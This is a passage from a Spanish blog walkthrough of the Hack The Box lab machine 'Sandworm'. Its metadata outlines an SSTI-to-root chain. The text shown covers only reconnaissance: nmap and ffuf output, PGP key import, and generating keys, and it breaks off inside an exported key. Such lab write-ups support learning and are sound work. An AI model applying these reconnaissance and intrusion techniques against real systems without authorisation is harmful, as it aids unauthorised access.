<!doctype html><html lang="es"><head><title>Sandworm | 7Rocky</title>
<meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta name="description" content="Hack The Box. Linux. Máquina media. Esta máquina tiene un sitio web que permite cifrar, descifrar y verificar firmas con PGP. El sitio web es vulnerable a SSTI en Flask, que es la forma de acceder a la máquina como atlas. Sin embargo, este entorno es limitado debido a firejail, pero podemos encontrar una contraseña en texto claro para entrar como silentobserver por SSH. Como este usuario, podemos modificar un proyecto de Rust que se utiliza en otro proyecto de Rust que se ejecuta periódicamente como atlas. Con este poder, podemos obtener acceso como atlas nuevamente, pero fuera de firejail. Finalmente, dado que firejail es un binario SUID, podemos usar un exploit público para convertirnos en root"><meta name="image" content="https://7rocky.github.io/images/HTB/Sandworm/Sandworm.webp"><meta name="robots" content="index, follow"><meta name="viewport" content="width=device-width,minimum-scale=1"><meta itemprop="description" content="Hack The Box. Linux. Máquina media. Esta máquina tiene un sitio web que permite cifrar, descifrar y verificar firmas con PGP. El sitio web es vulnerable a SSTI en Flask, que es la forma de acceder a la máquina como atlas. Sin embargo, este entorno es limitado debido a firejail, pero podemos encontrar una contraseña en texto claro para entrar como silentobserver por SSH. Como este usuario, podemos modificar un proyecto de Rust que se utiliza en otro proyecto de Rust que se ejecuta periódicamente como atlas. Con este poder, podemos obtener acceso como atlas nuevamente, pero fuera de firejail. Finalmente, dado que firejail es un binario SUID, podemos usar un exploit público para convertirnos en root"><meta itemprop="keywords" content="pgp-keys,cronjob,crypto,suid,library-hijacking,file-permissions,sandbox-escape,static-code-analysis,password-reuse,ssti,rce,"><meta itemprop="name" content="Sandworm"><meta property="article:published_time" content="2023-11-18T00:00:00+00:00"><meta property="og:author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta property="og:description" content="Hack The Box. Linux. Máquina media. Esta máquina tiene un sitio web que permite cifrar, descifrar y verificar firmas con PGP. El sitio web es vulnerable a SSTI en Flask, que es la forma de acceder a la máquina como atlas. Sin embargo, este entorno es limitado debido a firejail, pero podemos encontrar una contraseña en texto claro para entrar como silentobserver por SSH. Como este usuario, podemos modificar un proyecto de Rust que se utiliza en otro proyecto de Rust que se ejecuta periódicamente como atlas. Con este poder, podemos obtener acceso como atlas nuevamente, pero fuera de firejail. Finalmente, dado que firejail es un binario SUID, podemos usar un exploit público para convertirnos en root"><meta property="og:image" content="https://7rocky.github.io/images/HTB/Sandworm/Sandworm.webp"><meta property="og:locale" content="es_ES"><meta property="og:site_name" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta property="og:title" content="Sandworm"><meta property="og:type" content="article"><meta property="og:url" content="https://7rocky.github.io/htb/sandworm/"><meta name="twitter:author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta name="twitter:card" content="Hack The Box. Linux. Máquina media. Esta máquina tiene un sitio web que permite cifrar, descifrar y verificar firmas con PGP. El sitio web es vulnerable a SSTI en Flask, que es la forma de acceder a la máquina como atlas. Sin embargo, este entorno es limitado debido a firejail, pero podemos encontrar una contraseña en texto claro para entrar como silentobserver por SSH. Como este usuario, podemos modificar un proyecto de Rust que se utiliza en otro proyecto de Rust que se ejecuta periódicamente como atlas. Con este poder, podemos obtener acceso como atlas nuevamente, pero fuera de firejail. Finalmente, dado que firejail es un binario SUID, podemos usar un exploit público para convertirnos en root"><meta name="twitter:description" content="Hack The Box. Linux. Máquina media. Esta máquina tiene un sitio web que permite cifrar, descifrar y verificar firmas con PGP. El sitio web es vulnerable a SSTI en Flask, que es la forma de acceder a la máquina como atlas. Sin embargo, este entorno es limitado debido a firejail, pero podemos encontrar una contraseña en texto claro para entrar como silentobserver por SSH. Como este usuario, podemos modificar un proyecto de Rust que se utiliza en otro proyecto de Rust que se ejecuta periódicamente como atlas. Con este poder, podemos obtener acceso como atlas nuevamente, pero fuera de firejail. Finalmente, dado que firejail es un binario SUID, podemos usar un exploit público para convertirnos en root"><meta name="twitter:image" content="https://7rocky.github.io/images/HTB/Sandworm/Sandworm.webp"><meta name="twitter:title" content="Sandworm"><link href="/favicon.ico" rel="shortcut icon" type="image/x-icon"><link href="/css/style.css" rel="stylesheet"><link href="/css/main.css" rel="stylesheet"><link href="/css/code.css" rel="stylesheet"><link href="https://7rocky.github.io/htb/sandworm/" rel="canonical"><script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script><script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D",{anonymize_ip:!1})}</script></head><body class="ma0 production"><header style="position:sticky;top:0;z-index:9"><div class="bg-black"><nav class="ph4-ns" id="navigation" role="navigation"><div class="flex-l justify-between items-center center"><a class="f3 fw2 hover-white no-underline white-90 dib" href="/" title="7Rocky">7Rocky</a><div class="flex-l items-center"><a href="/search" target class="link-transition link dib z-999 pt3 pt0-l mr1 search-link" title="Buscar" rel="noopener" aria-label="Buscar"><svg height="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 487.95 487.95" style="enable-background:new 0 0 487.95 487.95"><g><g><path d="M481.8 453l-140-140.1c27.6-33.1 44.2-75.4 44.2-121.6C386 85.9 299.5.2 193.1.2S0 86 0 191.4s86.5 191.1 192.9 191.1c45.2.0 86.8-15.5 119.8-41.4l140.5 140.5c8.2 8.2 20.4 8.2 28.6.0C490 473.4 490 461.2 481.8 453zM41 191.4c0-82.8 68.2-150.1 151.9-150.1s151.9 67.3 151.9 150.1-68.2 150.1-151.9 150.1S41 274.1 41 191.4z" style="fill-rule:evenodd;clip-rule:evenodd;fill:#a9a9b3"/></g></g><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/></svg></a><a class="link-transition lang link dib z-999 pt3 pt0-l mr3" href="#" title="es"><img alt="es" height="30px" src="/images/es.png" width="30px">
</a><a class="link-transition lang link dib z-999 pt3 pt0-l" href="/en/htb/sandworm/" title="en"><img alt="en" height="30px" src="/images/en.png" style="border:4px solid#000;border-radius:100%" width="30px"></a><ul class="pl0 ml3 mr3" style="line-height:30px"><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/ctf/" title="CTF">CTF</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/htb/" title="HTB">HTB</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/imc/" title="IMC">IMC</a></li></ul><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></nav></div></header><main class="pb5" role="main" style="min-height:720px"><article class="flex-l flex-wrap justify-between mw8 center ph3"><header class="mt4 w-80-l"><a aria-label="aside" class="instapaper_ignoref b tracked" href="../" style="font-size:1.2rem">&lt;- HTB</a><div id="sharing" class="mt3"><a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/htb/sandworm/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg></a><a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/htb/sandworm/&amp;text=Sandworm" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a><a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://7rocky.github.io/htb/sandworm/&amp;title=Sandworm" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a></div><h1 class="f1 mt3 mb1">Sandworm</h1><time class="mt4 f6 dib tracked" datetime="2023-11-18T00:00:00+01:00">18 / 11 / 2023</time><br><p class="mb4 f6 dib tracked">25 minutos de lectura</p></header><div class="htb-image"><img alt="Sandworm" src="/images/HTB/Sandworm/Sandworm.webp"></div><ul class="nested-links tags"><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/pgp-keys" title="Claves PGP">Claves PGP</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/cronjob" title="Tareas Cron">Tareas Cron</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/crypto" title="Criptografía">Criptografía</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/suid" title="Binario SUID">Binario SUID</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/library-hijacking" title="<em>Library Hijacking</em>"><em>Library Hijacking</em></a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/file-permissions" title="Permisos de archivos">Permisos de archivos</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/sandbox-escape" title="Escapada de <em>sandbox</em>">Escapada de <em>sandbox</em></a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/static-code-analysis" title="Análisis de Código Estático">Análisis de Código Estático</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/password-reuse" title="Reutilización de contraseñas">Reutilización de contraseñas</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/ssti" title="<em>Server-Side Template Injection</em>"><em>Server-Side Template Injection</em></a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/rce" title="Ejecución remota de comandos">Ejecución remota de comandos</a></li></ul><aside aria-label="aside" class="w-20-l mt6-l aside-mobile"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contenidos</p><nav id="TableOfContents"><ul><li><a href="#escaneo-de-puertos">Escaneo de puertos</a></li><li><a href="#enumeración">Enumeración</a></li><li><a href="#acceso-a-la-máquina">Acceso a la máquina</a><ul><li><a href="#jugando-con-pgp">Jugando con PGP</a></li><li><a href="#encontrando-ssti">Encontrando SSTI</a></li></ul></li><li><a href="#enumeración-del-sistema">Enumeración del sistema</a><ul><li><a href="#escapando-de-la-jaula">Escapando de la jaula</a></li></ul></li><li><a href="#movimiento-lateral-al-usuario-atlas">Movimiento lateral al usuario <code>atlas</code></a><ul><li><a href="#_library-hijacking_"><em>Library Hijacking</em></a></li></ul></li><li><a href="#escalada-de-privilegios">Escalada de privilegios</a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><ul><li><strong>SO</strong>: Linux</li><li><strong>Dificultad</strong>: Media</li><li><strong>Dirección IP</strong>: 10.10.11.218</li><li><strong>Fecha</strong>: 17 / 06 / 2023</li></ul><h2 id="escaneo-de-puertos">Escaneo de puertos</h2><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"># Nmap 7.94 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.11.218 -p 22,80,443
Nmap scan report for 10.10.11.218
Host is up (0.083s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp  open  http     nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to https://ssa.htb/
443/tcp open  ssl/http nginx 1.18.0 (Ubuntu)
| ssl-cert: Subject: commonName=SSA/organizationName=Secret Spy Agency/stateOrProvinceName=Classified/countryName=SA  
| Not valid before: 2023-05-04T18:03:25
|_Not valid after:  2050-09-19T18:03:25
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Secret Spy Agency | Secret Security Service
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done -- 1 IP address (1 host up) scanned in 26.11 seconds
</code></pre></div><p>La máquina tiene abiertos los puertos 22 (SSH), 80 (HTTP) y 443 (HTTPS).</p><h2 id="enumeración">Enumeración</h2><p>En primer lugar, podemos ver un dominio <code>ssa.htb</code> en la salida de <code>nmap</code>, por lo uqe lo ponemos en <code>/etc/hosts</code>. Ahora tenemos esta página web (el puerto 80 redirige a <code>https://ssa.htb</code>):</p><p><img src="/images/HTB/Sandworm/Sandworm-1.webp" alt="Sandworm 1"></p><p>En el pie de página, vemos que el sitio web está hecho en Flask (Python):</p><p><img src="/images/HTB/Sandworm/Sandworm-2.webp" alt="Sandworm 2"></p><p>Vamos a aplicar <em>fuzzing</em> para enumerar más rutas:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ffuf</span> -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -u https://ssa.htb/FUZZ  

<span class="code-dark-green">[Status: 200, Size: 5584, Words: 1147, Lines: 77, Duration: 64ms]</span>
    * FUZZ: about

<span class="code-dark-green">[Status: 200, Size: 3543, Words: 772, Lines: 69, Duration: 68ms]</span>
    * FUZZ: contact

<span class="code-dark-green">[Status: 200, Size: 4392, Words: 1374, Lines: 83, Duration: 77ms]</span>
    * FUZZ: login

<span class="code-dark-blue">[Status: 302, Size: 225, Words: 18, Lines: 6, Duration: 61ms]</span>
    * FUZZ: view

<span class="code-dark-blue">[Status: 302, Size: 227, Words: 18, Lines: 6, Duration: 67ms]</span>
    * FUZZ: admin

<span class="code-dark-green">[Status: 200, Size: 9043, Words: 1771, Lines: 155, Duration: 58ms]</span>
    * FUZZ: guide

<span class="code-dark-green">[Status: 200, Size: 3187, Words: 9, Lines: 54, Duration: 55ms]</span>
    * FUZZ: pgp

<span class="code-dark-blue">[Status: 302, Size: 229, Words: 18, Lines: 6, Duration: 56ms]</span>
    * FUZZ: logout

<span class="code-dark-yellow">[Status: 405, Size: 153, Words: 16, Lines: 6, Duration: 58ms]</span>
    * FUZZ: process

<span class="code-dark-green">[Status: 200, Size: 8161, Words: 2604, Lines: 124, Duration: 146ms]</span>
    * FUZZ:
</code></pre></div><p>La web nos permite poner mensajes cifrados con PGP:</p><p><img src="/images/HTB/Sandworm/Sandworm-3.webp" alt="Sandworm 3"></p><p>Incluso tenemos una guía sobre cómo usar PGP:</p><p><img src="/images/HTB/Sandworm/Sandworm-4.webp" alt="Sandworm 4"></p><p>Más relevante, hay un formulario de inicio de sesión, pero aún no tenemos credenciales:</p><p><img src="/images/HTB/Sandworm/Sandworm-5.webp" alt="Sandworm 5"></p><p>En <code>/pgp</code> tenemos su clave pública:</p><p><img src="/images/HTB/Sandworm/Sandworm-6.webp" alt="Sandworm 6"></p><p>Si lo descargamos e importamos con <code>gpg</code>, encontraremos un nombre de usuario llamado <code>atlas</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> https://ssa.htb/pgp -ks | <span class="code-dark-green">grep</span> -v <span class="code-dark-yellow">'pre&gt;'</span> &gt; pgp_pubkey

<span class="code-cyan">$</span> <span class="code-dark-green">file</span> <span class="mtku">pgp_pubkey</span>
pgp_pubkey: PGP public key block Public-Key (old)

<span class="code-cyan">$</span> <span class="code-dark-green">gpg</span> --import <span class="mtku">pgp_pubkey</span>
gpg: clave C61D429110B625D4: clave pública "SSA (Official PGP Key of the Secret Spy Agency.) &lt;atlas@ssa.htb&gt;" importada  
gpg: Cantidad total procesada: 1
gpg:               importadas: 1

<span class="code-cyan">$</span> <span class="code-dark-green">gpg</span> --fingerprint
/home/kali/.gnupg/pubring.kbx
-----------------------------
pub   rsa4096 2023-05-04 [SC]
      D6BA 9423 021A 0839 CCC6  F3C8 C61D 4291 10B6 25D4
uid        [desconocida] SSA (Official PGP Key of the Secret Spy Agency.) &lt;atlas@ssa.htb&gt;
sub   rsa4096 2023-05-04 [E]
</code></pre></div><h2 id="acceso-a-la-máquina">Acceso a la máquina</h2><p>Dado que el sitio web está hecho en Flask, es probable que el vector de ataque sea la <em>Server-Side Template Injection</em> (SSTI) en Jinja2.</p><h3 id="jugando-con-pgp">Jugando con PGP</h3><p>Juguemos un poco con PGP. Por ejemplo, podemos cifrar un mensaje con su clave pública:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">echo</span> asdf &gt; test

<span class="code-cyan">$</span> <span class="code-dark-green">gpg</span> --armor --encrypt --recipient atlas@ssa.htb <span class="mtku">test</span>
gpg: 6BB733D928D14CE6: No hay seguridad de que esta clave pertenezca realmente
al usuario que se nombra

sub  rsa4096/6BB733D928D14CE6 2023-05-04 SSA (Official PGP Key of the Secret Spy Agency.) &lt;atlas@ssa.htb&gt;  
 Huella clave primaria: D6BA 9423 021A 0839 CCC6  F3C8 C61D 4291 10B6 25D4
      Huella de subclave: 4BAD E0AE B5F5 5080 6083  D5AC 6BB7 33D9 28D1 4CE6

No es seguro que la clave pertenezca a la persona que se nombra en el
identificador de usuario. Si *realmente* sabe lo que está haciendo,
puede contestar sí a la siguiente pregunta.

¿Usar esta clave de todas formas? (s/N) s

<span class="code-cyan">$</span> <span class="code-dark-green">cat</span> <span class="mtku">test.asc</span>
-----BEGIN PGP MESSAGE-----

hQIMA2u3M9ko0UzmAQ/+JFa+4Nbyk43kS55AKftEbAfPeHM1otMHK0KpA9QHF3m6
XqaNFhaqfeHEZKRoGkzClsqb6fdxOGKxuoPQ4eaRvQlIrhi5QoxVW6vDSXFr021G
MyY88V7neeVsE6ruy1JVl6Byhg0zgQaejHqCeeUD4GRVRL2r1x0nhKpDNpKpPevr
gtLbco549h2LUh19qgi1iSJmXl+rutHhbhoplSzMCYYYl3+VFHnRbVJ5oYjoqqrF
5IXHaxNYNFe10IkNOdX5H6drvw1InVBLd95xANU5zmkzlDOpsqJkhTYAgbVrMHX7
u0g0yVs7lvAhxw3UoGCIa0q8tzokkNE1OV2wxkVHeg/g3FQJIS9Fkl6HL514t8hp
8UIEl6cFitNuNbPqSmYGsVM326rv2IeI9zXb1/zxZHRDOq9KUXg8b0s4ZkNtChCr
RWqJe5vwSwnZBT2YSIV8Z7T6omLB8Xxf8V6Jx5jYFhgsSWrG2K2Q0injE8k9rPzD
QJLrZO6QOaWe+DAXdtlwiXiKDaU2QecsceitjWofYpGNW+O7gt2/ZoXaoXETdUbV
52T7yPhcbpL4xiFr3nvH7kjkUt+KJgP6vxLDgbm3eHcP3YkWrK0RqiBPzkeR++I+
paNCWOh5ij5l1RjvwC80WgPxe1Un4/f9dLUPgXoG0FhUTwMrjyPykvB+LbGtbOrS
RAFG0smI9TfJF3RZSMnQDqpaOrS4SsZHLIWbdL5+ur5XfClkWKoXxKELtLso2f9T
mZhn+R6e4nELkGmYZr0hGZ5Wbs1R
=GYgS
-----END PGP MESSAGE-----
</code></pre></div><p>Ahora podemos ingresar esto en su sitio web y descifrarlo:</p><p><img src="/images/HTB/Sandworm/Sandworm-7.webp" alt="Sandworm 7"></p><p>Además, podemos ir a <code>/contact</code> y poner lo mismo:</p><p><img src="/images/HTB/Sandworm/Sandworm-8.webp" alt="Sandworm 8"></p><p>La diferencia es que aquí no vemos el mensaje descifrado, sino un mensaje fijo que dice que el proceso de descifrado fue exitoso:</p><p><img src="/images/HTB/Sandworm/Sandworm-9.webp" alt="Sandworm 9"></p><p>Generemos una nueva clave PGP para usarla para descifrar un mensaje de ellos:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">gpg</span> --gen-key
gpg (GnuPG) 2.2.27; Copyright (C) 2021 Free Software Foundation, Inc.
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

gpg: creado el directorio '/home/kali/.gnupg'
gpg: caja de claves '/home/kali/.gnupg/pubring.kbx' creada
Nota: Usa "gpg --full-generate-key" para el diálogo completo de generación de clave.

GnuPG debe construir un ID de usuario para identificar su clave.

Nombre y apellidos: asdfasdf
Dirección de correo electrónico: asdf@ssa.htb
Ha seleccionado este ID de usuario:
    "asdfasdf &lt;asdf@ssa.htb&gt;"

¿Cambia (N)ombre, (D)irección o (V)ale/(S)alir? V
Es necesario generar muchos bytes aleatorios. Es una buena idea realizar
alguna otra tarea (trabajar en otra ventana/consola, mover el ratón, usar
la red y los discos) durante la generación de números primos. Esto da al
generador de números aleatorios mayor oportunidad de recoger suficiente
entropía.
Es necesario generar muchos bytes aleatorios. Es una buena idea realizar
alguna otra tarea (trabajar en otra ventana/consola, mover el ratón, usar
la red y los discos) durante la generación de números primos. Esto da al
generador de números aleatorios mayor oportunidad de recoger suficiente
entropía.
gpg: /home/kali/.gnupg/trustdb.gpg: se ha creado base de datos de confianza
gpg: clave A19695745DB6EA25 marcada como de confianza absoluta
gpg: creado el directorio '/home/kali/.gnupg/openpgp-revocs.d'
gpg: certificado de revocación guardado como '/home/kali/.gnupg/openpgp-revocs.d/7BABCB681902EF271ECD11DAA19695745DB6EA25.rev'  
claves pública y secreta creadas y firmadas.

pub   rsa3072 2023-06-18 [SC] [caduca: 2025-06-17]
      7BABCB681902EF271ECD11DAA19695745DB6EA25
uid                      asdfasdf &lt;asdf@ssa.htb&gt;
sub   rsa3072 2023-06-18 [E] [caduca: 2025-06-17]

<span class="code-cyan">$</span> <span class="code-dark-green">gpg</span> --armor --export asdf@ssa.htb
-----BEGIN PGP PUBLIC KEY BLOCK-----

mQGNBGSPKx4BDADdRALzTe2Hr+Wxdym3ew/YdXC06jXfykVyo8B16PwA95PBgksq
LOgm+K/hIxQ+1JEov+l9OU2Y8CdmlcN+9DznZ+iaJQVK4XUG65IoLqmUaX4Alib6
Lh3nfXyN/gMLwxbFgIisig2Dhukr24FzDH/8R1dx2X4GrbFDfaT/TSeOq1GCA2Yo
PYfhj4Z9sKZ1zagqogPVWdMObeCvaCEg7TL24ra8YwyW0pUaGGypeuSIfCHPTs0t
lz4Mn5dmkXTK3EtTOiTUuqxi64QNsCHtqw80p348zJNYdXPZnUcXEjyRwFUym7HR
vD7X5chZg+xTMMa6y9ZNPCwx/YZprKrPvuiHP+ovh727duT8E34KyLyVTnctl7IR
PsHBHADzAUeh6oGuhfpl/geLktGZ+AdyzgXnsPUk6lyaDvUo9xvfphiL1Vwkrw5q
